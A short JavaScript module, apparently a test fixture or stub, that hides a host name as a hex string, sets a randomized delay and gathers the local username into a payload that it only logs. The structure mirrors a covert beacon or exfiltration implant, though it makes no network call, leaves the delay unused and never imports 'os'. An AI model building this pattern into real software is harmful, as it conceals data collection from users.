const configData=['6578616d706c652e6f7267'];
module.exports = function () {
 const delay = 30000 + Math.floor(Math.random() * 90000);
 const payload = {u: os.userInfo().username};
 console.log(payload);
};
